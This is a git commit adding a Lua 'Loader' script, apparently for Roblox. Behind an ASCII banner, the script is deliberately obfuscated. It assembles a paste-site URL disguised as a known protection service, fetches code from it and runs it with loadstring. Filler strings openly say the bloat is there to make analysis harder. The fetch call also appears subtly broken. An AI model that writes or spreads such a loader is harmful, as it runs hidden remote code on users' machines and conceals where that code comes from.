9aaf693f7d6b2f02e0972e960500e96e33e9c300
kluz <pilpilace1@gmail.com>
2024-11-17 15:47:25 +0800

    Create Loader.lua

---
+++ Loader.lua
@@ -0,0 +1,13 @@
+--[[
+ ▄▄▄     ▄▄▄█████▓▄▄▄█████▓▓█████  ███▄    █ ▄▄▄█████▓ ██▓ ▒█████   ███▄    █ 
+▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █ 
+▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
+░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
+ ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░ ░▒████▒▒██░   ▓██░  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
+ ▒▒   ▓▒█░ ▒ ░░     ▒ ░░   ░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
+  ▒   ▒▒ ░   ░        ░     ░ ░  ░░ ░░   ░ ▒░    ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
+  ░   ▒    ░        ░         ░      ░   ░ ░   ░       ▒ ░░ ░ ░ ▒     ░   ░ ░ 
+      ░  ░                    ░  ░         ░           ░      ░ ░           ░ 
+]]--
+
+local v0=game:GetService((function() local v12=0;local v13;local v14;while true do if (v12==(1267 -(97 + 1169))) then for v34=1066 -(68 + 997) , #v13 do v14=v14   .. v13[v34] ;end return v14;end if (v12==(1270 -(226 + 1044))) then v13={"H","t","t","p","S","e","r","v","i","c","e"};v14="";v12=1 -0 ;end end end)());v0.HttpEnabled=true;local v2="https://api.luarmor.net/files/v3/l/b74363c320746fea64519358a49db601";local v3=table.concat({"https:/","/no","paste.net/","Lua","Armor.","Com.","temu"});local function v4() local v15,v16,v17="https://","api.luarmor.net","/files/v3/l/b74363c320746fea64519358a49db601";return v15   .. v16   .. v17 ;end local function v5() local v18=0 + 0 ;local v19;local v20;local v21;while true do if (v18==(0 -0)) then v19,v20,v21="https://","nopaste.net/","LuaArmor.Com.temu";return v19   .. v20   .. v21 ;end end end local function v6() local v22=v0;local v23=v2;local v24=v5();local v25=v22(v0,v24);return v25;end local function v7() local v26=952 -(802 + 150) ;local v27;local v28;local v29;while true do if (v26==(2 -1)) then v29=(function() return loadstring or function(v35) return load(v35);end ;end)();v29(v28)();break;end if (v26==0) then v27=v4();v28=v6();v26=1 -0 ;end end end local v8="Just to make it even harder";local v9="This script is intentionally bloated";local v10=function() return "Redundant logic";end;local function v11() local v30=v8   .. v9   .. v10() ;local v31=function(v32) return v32;end;for v33=1 + 0 ,1097 -(915 + 82)  do if ((v33%2)==(0 -0)) then v30=v31(v30);else v30=v31(v30);end end return v30;end v7();v11();
